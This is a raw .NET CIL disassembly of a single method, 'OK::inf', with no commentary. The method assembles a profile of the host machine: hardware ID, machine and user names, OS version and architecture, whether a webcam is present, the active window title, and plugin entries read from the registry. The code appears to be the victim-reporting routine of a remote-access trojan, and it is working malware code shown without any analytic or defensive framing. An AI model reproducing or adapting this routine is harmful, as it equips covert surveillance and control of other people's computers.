  .method public static string  inf() cil managed
  {
    // Code size       941 (0x3ad)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string[] V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             string V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string V_14,
             valuetype [mscorlib]System.DateTime V_15,
             valuetype [mscorlib]System.DateTime V_16,
             int32 V_17,
             string[] V_18)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.1
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                                        object)
      IL_001f:  ldstr      ""
      IL_0024:  ldc.i4.0
      IL_0025:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002a:  brfalse.s  IL_005c

      IL_002c:  ldloc.1
      IL_002d:  ldsflda    string j.OK::VN
      IL_0032:  call       string j.OK::DEB(string&)
      IL_0037:  ldstr      "_"
      IL_003c:  call       string j.OK::HWD()
      IL_0041:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0046:  stloc.s    V_13
      IL_0048:  ldloca.s   V_13
      IL_004a:  call       string j.OK::ENB(string&)
      IL_004f:  ldsfld     string j.OK::Y
      IL_0054:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0059:  stloc.1
      IL_005a:  leave.s    IL_00c7

      IL_005c:  ldloc.1
      IL_005d:  ldstr      "vn"
      IL_0062:  ldstr      ""
      IL_0067:  call       object j.OK::GTV(string,
                                                        object)
      IL_006c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0071:  stloc.s    V_13
      IL_0073:  ldloca.s   V_13
      IL_0075:  call       string j.OK::DEB(string&)
      IL_007a:  ldstr      "_"
      IL_007f:  call       string j.OK::HWD()
      IL_0084:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0089:  stloc.s    V_14
      IL_008b:  ldloca.s   V_14
      IL_008d:  call       string j.OK::ENB(string&)
      IL_0092:  ldsfld     string j.OK::Y
      IL_0097:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_009c:  stloc.1
      IL_009d:  leave.s    IL_00c7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009f:  dup
      IL_00a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a5:  stloc.3
      IL_00a6:  ldloc.1
      IL_00a7:  call       string j.OK::HWD()
      IL_00ac:  stloc.s    V_14
      IL_00ae:  ldloca.s   V_14
      IL_00b0:  call       string j.OK::ENB(string&)
      IL_00b5:  ldsfld     string j.OK::Y
      IL_00ba:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bf:  stloc.1
      IL_00c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c5:  leave.s    IL_00c7

    }  // end handler
    .try
    {
      IL_00c7:  ldloc.1
      IL_00c8:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00cd:  ldsfld     string j.OK::Y
      IL_00d2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00d7:  stloc.1
      IL_00d8:  leave.s    IL_00fa

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00da:  dup
      IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e0:  stloc.s    V_4
      IL_00e2:  ldloc.1
      IL_00e3:  ldstr      "\?\?"
      IL_00e8:  ldsfld     string j.OK::Y
      IL_00ed:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00f2:  stloc.1
      IL_00f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f8:  leave.s    IL_00fa

    }  // end handler
    .try
    {
      IL_00fa:  ldloc.1
      IL_00fb:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0100:  ldsfld     string j.OK::Y
      IL_0105:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010a:  stloc.1
      IL_010b:  leave.s    IL_012d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_010d:  dup
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0113:  stloc.s    V_5
      IL_0115:  ldloc.1
      IL_0116:  ldstr      "\?\?"
      IL_011b:  ldsfld     string j.OK::Y
      IL_0120:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0125:  stloc.1
      IL_0126:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012b:  leave.s    IL_012d

    }  // end handler
    .try
    {
      IL_012d:  ldloc.1
      IL_012e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0133:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0138:  stloc.s    V_15
      IL_013a:  ldloca.s   V_15
      IL_013c:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_0141:  stloc.s    V_16
      IL_0143:  ldloca.s   V_16
      IL_0145:  ldstr      "yy-MM-dd"
      IL_014a:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_014f:  ldsfld     string j.OK::Y
      IL_0154:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0159:  stloc.1
      IL_015a:  leave.s    IL_017c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015c:  dup
      IL_015d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0162:  stloc.s    V_6
      IL_0164:  ldloc.1
      IL_0165:  ldstr      "\?\?-\?\?-\?\?"
      IL_016a:  ldsfld     string j.OK::Y
      IL_016f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0174:  stloc.1
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  leave.s    IL_017c

    }  // end handler
    IL_017c:  ldloc.1
    IL_017d:  ldstr      ""
    IL_0182:  ldsfld     string j.OK::Y
    IL_0187:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_018c:  stloc.1
    .try
    {
      IL_018d:  ldloc.1
      IL_018e:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0193:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_0198:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_019d:  ldstr      "Microsoft"
      IL_01a2:  ldstr      ""
      IL_01a7:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ac:  ldstr      "Windows"
      IL_01b1:  ldstr      "Win"
      IL_01b6:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01bb:  ldstr      bytearray (AE 00 ) 
      IL_01c0:  ldstr      ""
      IL_01c5:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ca:  ldstr      bytearray (22 21 )                                           // "!
      IL_01cf:  ldstr      ""
      IL_01d4:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01d9:  ldstr      "  "
      IL_01de:  ldstr      " "
      IL_01e3:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e8:  ldstr      " Win"
      IL_01ed:  ldstr      "Win"
      IL_01f2:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01fc:  stloc.1
      IL_01fd:  leave.s    IL_021a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ff:  dup
      IL_0200:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0205:  stloc.s    V_7
      IL_0207:  ldloc.1
      IL_0208:  ldstr      "\?\?"
      IL_020d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0212:  stloc.1
      IL_0213:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0218:  leave.s    IL_021a

    }  // end handler
    IL_021a:  ldloc.1
    IL_021b:  ldstr      "SP"
    IL_0220:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0225:  stloc.1
    .try
    {
      IL_0226:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_022b:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0230:  ldstr      " "
      IL_0235:  ldc.i4.m1
      IL_0236:  ldc.i4.0
      IL_0237:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_023c:  stloc.s    V_8
      IL_023e:  ldloc.s    V_8
      IL_0240:  ldlen
      IL_0241:  conv.ovf.i4
      IL_0242:  ldc.i4.1
      IL_0243:  bne.un.s   IL_0251

      IL_0245:  ldloc.1
      IL_0246:  ldstr      "0"
      IL_024b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0250:  stloc.1
      IL_0251:  ldloc.1
      IL_0252:  ldloc.s    V_8
      IL_0254:  ldloc.s    V_8
      IL_0256:  ldlen
      IL_0257:  conv.ovf.i4
      IL_0258:  ldc.i4.1
      IL_0259:  sub.ovf
      IL_025a:  ldelem.ref
      IL_025b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0260:  stloc.1
      IL_0261:  leave.s    IL_027e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0263:  dup
      IL_0264:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0269:  stloc.s    V_9
      IL_026b:  ldloc.1
      IL_026c:  ldstr      "0"
      IL_0271:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0276:  stloc.1
      IL_0277:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_027c:  leave.s    IL_027e

    }  // end handler
    .try
    {
      IL_027e:  ldc.i4.s   38
      IL_0280:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0285:  ldstr      "x86"
      IL_028a:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_028f:  brfalse.s  IL_02a4

      IL_0291:  ldloc.1
      IL_0292:  ldstr      " x64"
      IL_0297:  ldsfld     string j.OK::Y
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02a1:  stloc.1
      IL_02a2:  leave.s    IL_02d2

      IL_02a4:  ldloc.1
      IL_02a5:  ldstr      " x86"
      IL_02aa:  ldsfld     string j.OK::Y
      IL_02af:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02b4:  stloc.1
      IL_02b5:  leave.s    IL_02d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02b7:  dup
      IL_02b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02bd:  stloc.s    V_10
      IL_02bf:  ldloc.1
      IL_02c0:  ldsfld     string j.OK::Y
      IL_02c5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02ca:  stloc.1
      IL_02cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02d0:  leave.s    IL_02d2

    }  // end handler
    IL_02d2:  call       bool j.OK::Cam()
    IL_02d7:  brfalse.s  IL_02ec

    IL_02d9:  ldloc.1
    IL_02da:  ldstr      "Yes"
    IL_02df:  ldsfld     string j.OK::Y
    IL_02e4:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02e9:  stloc.1
    IL_02ea:  br.s       IL_02fd

    IL_02ec:  ldloc.1
    IL_02ed:  ldstr      "No"
    IL_02f2:  ldsfld     string j.OK::Y
    IL_02f7:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02fc:  stloc.1
    IL_02fd:  ldloc.1
    IL_02fe:  ldsfld     string j.OK::VR
    IL_0303:  ldsfld     string j.OK::Y
    IL_0308:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_030d:  stloc.1
    IL_030e:  ldloc.1
    IL_030f:  ldstr      ".."
    IL_0314:  ldsfld     string j.OK::Y
    IL_0319:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_031e:  stloc.1
    IL_031f:  ldloc.1
    IL_0320:  call       string j.OK::ACT()
    IL_0325:  ldsfld     string j.OK::Y
    IL_032a:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_032f:  stloc.1
    IL_0330:  ldstr      ""
    IL_0335:  stloc.2
    .try
    {
      IL_0336:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_033b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0340:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0345:  ldstr      "Software\\"
      IL_034a:  ldsfld     string j.OK::RG
      IL_034f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0354:  ldc.i4.0
      IL_0355:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_035a:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_035f:  stloc.s    V_18
      IL_0361:  ldc.i4.0
      IL_0362:  stloc.s    V_17
      IL_0364:  br.s       IL_038c

      IL_0366:  ldloc.s    V_18
      IL_0368:  ldloc.s    V_17
      IL_036a:  ldelem.ref
      IL_036b:  stloc.s    V_11
      IL_036d:  ldloc.s    V_11
      IL_036f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0374:  ldc.i4.s   32
      IL_0376:  bne.un.s   IL_0386

      IL_0378:  ldloc.2
      IL_0379:  ldloc.s    V_11
      IL_037b:  ldstr      ","
      IL_0380:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0385:  stloc.2
      IL_0386:  ldloc.s    V_17
      IL_0388:  ldc.i4.1
      IL_0389:  add.ovf
      IL_038a:  stloc.s    V_17
      IL_038c:  ldloc.s    V_17
      IL_038e:  ldloc.s    V_18
      IL_0390:  ldlen
      IL_0391:  conv.ovf.i4
      IL_0392:  blt.s      IL_0366

      IL_0394:  leave.s    IL_03a5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0396:  dup
      IL_0397:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_039c:  stloc.s    V_12
      IL_039e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03a3:  leave.s    IL_03a5

    }  // end handler
    IL_03a5:  ldloc.1
    IL_03a6:  ldloc.2
    IL_03a7:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_03ac:  ret
  } // end of method OK::inf
